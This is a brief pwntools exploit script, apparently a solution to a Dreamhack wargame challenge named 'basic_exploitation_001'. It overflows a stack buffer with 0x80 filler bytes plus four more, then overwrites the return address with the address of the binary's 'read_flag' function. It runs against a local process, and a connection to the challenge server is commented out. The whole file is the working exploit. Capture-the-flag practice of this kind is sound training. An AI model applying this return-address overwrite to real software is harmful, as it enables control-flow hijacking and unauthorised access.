from pwn import *

# p = remote("host3.dreamhack.games", 19366)
p = process("./basic_exploitation_001")

e = ELF("basic_exploitation_001")

payload = b"A" * 0x80
payload += b"BBBB"
payload += p32(e.symbols["read_flag"])

p.sendline(payload)

p.interactive()